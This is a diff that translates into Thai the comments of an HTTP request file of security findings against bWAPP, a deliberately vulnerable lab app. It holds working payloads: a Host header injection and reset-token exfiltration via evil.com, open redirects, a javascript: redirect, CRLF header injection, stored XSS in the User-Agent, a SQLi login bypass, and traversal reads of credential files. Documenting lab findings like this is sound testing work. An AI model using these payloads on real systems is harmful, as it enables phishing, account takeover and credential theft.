@@ -3,68 +3,68 @@
 ###       Information disclosure, host header injection, open redirect,
 ###       HTML injection, response splitting, recon
 ###
-###   Everything here is unauthenticated or trivially authenticated recon that
-###   shortens the path to the findings in the other files.
+###   ทุกอย่างในไฟล์นี้เป็น recon ที่ไม่ต้องล็อกอิน หรือล็อกอินง่าย ๆ ก็ถึง
+###   ทำให้เส้นทางไปยัง findings ในไฟล์อื่นสั้นลง
 ### ============================================================================
 
 ### ---------------------------------------------------------------------------
-### INFO-01  CRITICAL: /admin/ publishes the credentials with NO auth
-###   admin/index.php renders admin/settings.php in a browser. It hands over
-###   the static login/password, the SMTP host, the A.I.M. bypass IPs and the
-###   Evil Bee mode flag - the full secret inventory, pre-auth.
-###   This is why AUTH-02..04 in 06-auth-session.http need no brute force.
+### INFO-01  CRITICAL: /admin/ เปิดเผย credential โดยไม่ต้อง auth
+###   admin/index.php render admin/settings.php ในเบราว์เซอร์ แล้วส่งออกมา
+###   ตรง ๆ ทั้ง user/password, SMTP host, IP ที่ข้าม A.I.M. ได้ และ flag
+###   ของ Evil Bee mode - คลังของ secret ทั้งหมดก่อนยังไม่ auth
+###   นี่คือเหตุผลว่า AUTH-02..04 ใน 06-auth-session.http ไม่ต้อง brute force
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/admin/ HTTP/1.1
 Host: localhost:8443
-### Expected: 200 WITHOUT any session cookie, body contains "bee/bug"
+### Expected: 200 โดยไม่มี session cookie ใด ๆ, body ต้องมี "bee/bug"
 
 
 ### ---------------------------------------------------------------------------
-### INFO-02  Same page, read through the traversal bug instead
-###   Confirms the same content is retrievable as raw source via LFI-05,
-###   so even a patched /admin/ page would not remove the exposure.
+### INFO-02  หน้าเดิม อ่านผ่านบั๊ก traversal แทน
+###   ยืนยันว่าเนื้อหาเดียวกันดึงออกมาเป็น source ดิบผ่าน LFI-05 ได้
+###   แม้แก้หน้า /admin/ แล้ว ก็ไม่ได้ตัดการรั่วไข้อนี้ออกไป
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=admin/settings.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, plaintext $db_username / $login / $password / $AIM_IPs
+### Expected: 200, เป็น plaintext $db_username / $login / $password / $AIM_IPs
 
 
 ### ---------------------------------------------------------------------------
-### INFO-03  phpinfo() - full server configuration
-###   Leaks: exact PHP version, every loaded extension, include_path,
-###   open_basedir, disable_functions, all environment variables, and
-###   $_SERVER. This is the recon step that tells you which of the other
-###   bugs are reachable (e.g. whether disable_functions blocks exec).
+### INFO-03  phpinfo() - config เต็ม ๆ ของ server
+###   รั่ว: PHP version แบบตรงตัว, extension ทุกตัวที่โหลด, include_path,
+###   open_basedir, disable_functions, environment variable ทุกตัว และ
+###   $_SERVER ขั้นนี้คือ recon ที่บอกว่า bug อื่นในไฟล์นี้เข้าถึงได้ตัวไหนบ้าง
+###   (เช่น disable_functions บล็อก exec หรือเปล่า)
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/phpinfo.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, ~80 KB, starts with "PHP Version 5.5.9-1ubuntu4.14"
+### Expected: 200, ~80 KB, ขึ้นต้นด้วย "PHP Version 5.5.9-1ubuntu4.14"
 
 
 ### ---------------------------------------------------------------------------
-### INFO-04  Verbose error reporting is on
-###   display_errors=1 in the SQL/XML paths is what makes error-based SQLi and
-###   the verbose error leak in 05-xxe-mail-upload.http XXI-03 possible.
-###   Any request that trips a PHP error returns the file path and the
-###   failing expression.
+### INFO-04  เปิด verbose error reporting อยู่
+###   display_errors=1 ในเส้นทาง SQL/XML คือตัวที่ทำให้ error-based SQLi
+###   และการรั่วของ verbose error ใน 05-xxe-mail-upload.http เคส XXI-03 เป็นไปได้
+###   request ไหนที่ทำให้ PHP error ได้ จะได้ file path
+###   ของไฟล์และ expression ที่ล้มเหลวกลับไปด้วย
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/does_not_exist.php HTTP/1.1
 Host: localhost:8443
-### Expected: 404 from Apache (routing), but any real PHP error returns a
-###           stack trace. Compare with the SQL error in XXI-03.
+### Expected: 404 จาก Apache (routing) แต่ถ้าเป็น PHP error จริง
+###           จะได้ stack trace กลับมา เทียบกับ SQL error ใน XXI-03
 
 
 ### ---------------------------------------------------------------------------
-### INFO-05  Directory listing enabled
-###   Autoindex is on, so every directory without an index file lists its
-###   full contents - including uploads (see UPL-01) and any backup files.
+### INFO-05  เปิด directory listing
+###   Autoindex เปิดอยู่ ทุกไดเรกทอรีที่ไม่มีไฟล์ index จะแสดงรายการ
+###   ไฟล์ทั้งหมด - รวมถึง uploads (ดู UPL-01) และไฟล์ backup ต่าง ๆ
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/images/ HTTP/1.1
 Host: localhost:8443
-### Expected: 200, body contains "Index of /images" and a file listing
-###           (this is also how an attacker finds the webshell from UPL-01)
+### Expected: 200, body ต้องมี "Index of /images" และมีรายการไฟล์
+###           (ผู้โจมตีหา webshell จาก UPL-01 ก็ใช้ทางนี้เหมือนกัน)
 
 
 ### ---------------------------------------------------------------------------
@@ -72,27 +72,27 @@ Host: localhost:8443
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/robots.txt HTTP/1.1
 Host: localhost:8443
-### Expected: 200, the file's contents - note what it disallows
+### Expected: 200, ได้เนื้อหาของไฟล์ - ดูด้วยว่ามัน Disallow อะไรบ้าง
 
 
 ### ---------------------------------------------------------------------------
 ### INFO-07  Host header injection
-###   hostheader_1.php writes $_SERVER["HTTP_HOST"] straight into the page and
-###   into absolute <link>/<script> URLs, so a spoofed Host both poisons cache
-###   entries and lets an attacker rewrite every link on the page.
-###   Set the Host header explicitly - some clients refuse to override it.
+###   hostheader_1.php เขียน $_SERVER["HTTP_HOST"] ลงหน้าเว็บตรง ๆ
+###   และลงไปใน URL แบบ absolute ของ <link>/<script> ดังนั้น Host ที่ปลอมมา
+###   ทำให้ cache เป็นพิษ และให้ผู้โจมตีเขียนลิงก์ทุกอันบนหน้านี้ใหม่ได้
+###   ตั้ง Host header ให้ชัดเจน - client บางตัวไม่ยอมให้ override
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/hostheader_1.php HTTP/1.1
 Host: evil.com
 Cookie: {{authCookie}}
-### Expected: 200, body contains "evil.com" in the stylesheet/script URLs
-###           and in the "click here" link back to the portal
+### Expected: 200, body ต้องมี "evil.com" ใน URL ของ stylesheet/script
+###           และในลิงก์ "click here" ที่กลับไปหน้า portal
 
 
 ### ---------------------------------------------------------------------------
-### INFO-08  Host header injection into an outbound request (password reset)
-###   hostheader_2.php sends a password-reset email; if the link is built from
-###   the Host header, a spoofed Host exfiltrates the reset token.
+### INFO-08  Host header injection ลง request ที่ยิงออกนอก (password reset)
+###   hostheader_2.php ส่งอีเมล password-reset ถ้าลิงก์ถูกสร้างจาก
+###   Host header การปลอม Host ก็ทำให้ reset token หลุดออกไปได้
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/hostheader_2.php HTTP/1.1
 Host: evil.com
@@ -100,36 +100,36 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 email=attacker%40evil.com&action=reset
-### Expected: 200, a reset is processed with no token and no verification
-###           Inspect the message text for the attacker-controlled host
+### Expected: 200, มีการประมวลผล reset แม้ไม่มี token และไม่มีการยืนยัน
+###           เปิดดูข้อความในอีเมลว่ามี host ที่ผู้โจมตีคุมไว้โผล่หรือไม่
 
 
 ### ---------------------------------------------------------------------------
-### INFO-09  THE ARCHITECTURAL FINDING: security level is a client cookie
-###   bWAPP's three "security levels" - the thing that looks like a WAF - is
-###   nothing but the cookie `security_level`. Change it in the browser and
-###   every mitigation in functions_external.php is skipped.
-###   Proof: send 'low' and see the app believe it is at 'low', then send '2'
-###   and watch the same SQLi from 01-sqli.http still succeed.
+### INFO-09  ข้อค้นพบเชิงสถาปัตยกรรม: security level เป็นแค่ cookie ของ client
+###   "security levels" สามระดับของ bWAPP - ตัวที่ดูเหมือน WAF - จริง ๆ
+###   มีแค่ cookie ชื่อ `security_level` แก้ค่าในเบราว์เซอร์เมื่อไร
+###   มาตรการป้องกันทุกตัวใน functions_external.php จะถูกข้ามหมด
+###   พิสูจน์: ส่ง 'low' แล้วดูว่าแอปเชื่อว่าตัวเองอยู่ที่ 'low' แล้วค่อยส่ง '2'
+###   แล้วดู SQLi ตัวเดิมจาก 01-sqli.http ว่ายังทำงานอยู่หรือไม่
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/security_level_check.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, reports the current level
+### Expected: 200, รายงานระดับปัจจุบัน
 ###
-### INFO-18  The same page while claiming to be hardened
+### INFO-18  หน้าเดิม ตอนอ้างว่าปิดสถิติความปลอดภัยแล้ว
 GET {{baseUrl}}/security_level_check.php HTTP/1.1
 Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=2
-### Expected: 200, reports "high" - but the app's only input here is our cookie
+### Expected: 200, รายงานว่า "high" - แต่ input เดียวที่แอปรับในเคสนี้คือ cookie ของเรา
 
 
 ### ---------------------------------------------------------------------------
-### INFO-10  Open redirect #1 - unvalidated url parameter
-###   unvalidated_redir_fwd_1.php does header("Location: " . $_REQUEST["url"]).
-###   At security_level 0 the value is used verbatim.
-###   Impact: phishing - the link starts with the trusted domain.
-###   Watch the Location response header, do NOT follow it.
+### INFO-10  Open redirect #1 - url parameter ไม่ผ่านการ validate
+###   unvalidated_redir_fwd_1.php ทำ header("Location: " . $_REQUEST["url"])
+###   ตอน security_level เป็น 0 ค่านี้ถูกใช้ตามสตริงตรง ๆ
+###   ผลกระทบ: phishing - ลิงก์ขึ้นต้นด้วยโดเมนที่ผู้ใช้เชื่อถือ
+###   ดูแค่ response header Location ห้าม follow ต่อเด็ดขาด
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/unvalidated_redir_fwd_1.php?url=https%3A%2F%2Fevil.com&form=submit HTTP/1.1
 Host: localhost:8443
@@ -138,9 +138,9 @@ Cookie: PHPSESSID={{session}}; security_level=0
 
 
 ### ---------------------------------------------------------------------------
-### INFO-11  Open redirect #2 - unvalidated ReturnUrl
-###   Same bug, different parameter name. Two independent instances means two
-###   independent fixes, and a fix on one is easy to miss on the other.
+### INFO-11  Open redirect #2 - ReturnUrl ไม่ผ่านการ validate
+###   บั๊กเดิม แต่ชื่อ parameter ต่างกัน สองจุดที่แยกจากกันต้องแก้สองที่
+###   และแก้อันหนึ่งแล้วมักลืมอีกอัน
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/unvalidated_redir_fwd_2.php?ReturnUrl=https%3A%2F%2Fevil.com HTTP/1.1
 Host: localhost:8443
@@ -149,16 +149,16 @@ Cookie: PHPSESSID={{session}}; security_level=0
 
 
 ### ---------------------------------------------------------------------------
-### INFO-12  Open redirect #3 - protocol-relative and javascript: variants
-###   Classic filter bypasses. "evil.com" alone and "//evil.com" both pass a
-###   naive "must start with http" check.
+### INFO-12  Open redirect #3 - แบบ protocol-relative และ javascript: variant
+###   filter bypass แบบคลาสสิก ทั้ง "evil.com" เปล่า ๆ และ "//evil.com"
+###   ผ่าน check ง่าย ๆ แบบ "ต้องขึ้นต้นด้วย http" ได้ทั้งคู่
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/unvalidated_redir_fwd_2.php?ReturnUrl=//evil.com HTTP/1.1
 Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=0
 ### Expected: 302, Location: //evil.com
 ###
-### INFO-19  The javascript: pseudo-protocol
+### INFO-19  javascript: pseudo-protocol
 GET {{baseUrl}}/unvalidated_redir_fwd_2.php?ReturnUrl=javascript%3Aalert(document.domain) HTTP/1.1
 Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=0
@@ -166,21 +166,21 @@ Cookie: PHPSESSID={{session}}; security_level=0
 
 
 ### ---------------------------------------------------------------------------
-### INFO-13  HTML / tag injection (not XSS, but the same missing-encoding root)
-###   htmli_get.php echoes firstname with no encoding. With a real browser you
-###   get markup injection; combined with an event handler it is XSS.
+### INFO-13  HTML / tag injection (ไม่ใช่ XSS แต่รากเดียวกันคือไม่ encode)
+###   htmli_get.php echo ค่า firstname ออกมาโดยไม่ encode ถ้าเปิดด้วย
+###   เบราว์เซอร์จริงจะได้ markup injection ถ้ารวมกับ event handler ก็คือ XSS
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/htmli_get.php?firstname=%3Ch1%3Einjected%3C%2Fh1%3E&lastname=x HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, body contains a literal <h1>injected</h1>
+### Expected: 200, body ต้องมี <h1>injected</h1> แบบ literal ตรง ๆ
 
 
 ### ---------------------------------------------------------------------------
 ### INFO-14  HTTP response splitting / CRLF header injection
-###   http_response_splitting.php builds a response header from the `ip`
-###   field. %0d%0a terminates the header line and starts a new one.
-###   Impact: cache poisoning, session fixation, and (on old stacks) XSS.
+###   http_response_splitting.php สร้าง response header ขึ้นจากฟิลด์ `ip`
+###   %0d%0a จบบรรทัด header แล้วเปิดบรรทัดใหม่
+###   ผลกระทบ: cache poisoning, session fixation และ (บน stack เก่า) XSS
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/http_response_splitting.php HTTP/1.1
 Host: localhost:8443
@@ -188,44 +188,44 @@ Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
 ip=127.0.0.1%0d%0aX-Injected-Header%3A%20injected&form=submit
-### Expected: 200, and X-Injected-Header present in the response headers
+### Expected: 200, และมี X-Injected-Header อยู่ใน response headers
 
 
 ### ---------------------------------------------------------------------------
-### INFO-15  User-Agent and client IP written to the database unvalidated
-###   xss_stored_4.php stores both, and the same INSERT in sqli_17.php is
-###   injectable. Send a payload as the User-Agent to confirm persistence.
+### INFO-15  User-Agent และ client IP ถูกเขียนลงฐานข้อมูลโดยไม่ validate
+###   xss_stored_4.php เก็บทั้งสองค่า และ INSERT เดียวกันใน sqli_17.php ก็
+###   inject ได้ ส่ง payload มาเป็น User-Agent เพื่อยืนยันว่ามันค้างจริง
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/xss_stored_4.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
 User-Agent: <script>alert("ua-stored")</script>
-### Expected: 200, and the payload now sits in the visitors table
+### Expected: 200, และ payload ไปอยู่ในตาราง visitors แล้ว
 
 
 ### ---------------------------------------------------------------------------
-### INFO-16  The backdoor.php upload helper is reachable
-###   Not a backdoor planted by an attacker - bWAPP ships this page on purpose
-###   to demonstrate writing files to an arbitrary directory. It is still an
-###   unauthenticated-ish arbitrary file write and must not exist in production.
-###   The uploadDir field lets you choose the destination directory.
+### INFO-16  หน้าช่วยอัปโหลด backdoor.php เข้าถึงได้
+###   ไม่ใช่ backdoor ที่ผู้โจมตีฝังไว้ - bWAPP จงใจแถมหน้านี้มา
+###   เพื่อสาธิตการเขียนไฟล์ลงไดเรกทอรีที่เลือกเอง แต่มันก็ยังเป็นการเขียน
+###   ไฟล์แบบ arbitrary ที่แทบไม่ต้อง auth ต้องไม่มีในระบบ production
+###   ฟิลด์ uploadDir ให้เลือกโฟลเดอร์ปลายทางได้
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/backdoor.php HTTP/1.1
 Host: localhost:8443
 Cookie: {{authCookie}}
-### Expected: 200, the "NSA file uploader" form with a `uploadDir` field
-###           defaulting to /var/www/bWAPP/images
+### Expected: 200, เจอฟอร์ม "NSA file uploader" ที่มีฟิลด์ `uploadDir`
+###           ค่าเริ่มต้นคือ /var/www/bWAPP/images
 
 
 ### ---------------------------------------------------------------------------
-### INFO-17  login.php is correctly escaped - negative control
-###   The one login form in the application that is NOT injectable: it uses
-###   mysqli_real_escape_string() and BINARY password comparison. Recording
-###   the negative keeps the report honest about what is actually broken.
+### INFO-17  login.php escape ถูกต้องแล้ว - negative control
+###   ฟอร์ม login เดียวในแอปที่ inject ไม่ได้: ใช้ mysqli_real_escape_string()
+###   และเทียบ password แบบ BINARY บันทึกเคสที่ไม่พังไว้ด้วย
+###   รายงานถึงจะได้บอกตามตรงว่าอะไรพังจริงบ้าง
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/login.php HTTP/1.1
 Host: localhost:8443
 Content-Type: application/x-www-form-urlencoded
 
 login=bee%27%20OR%20%271%27%3D%271%20--%20-&password=bug&security_level=0&form=submit
-### Expected: 200 with "Failed to login" - escaping holds on this endpoint
+### Expected: 200 พร้อมข้อความ "Failed to login" - escaping ยังอยู่ใน endpoint นี้
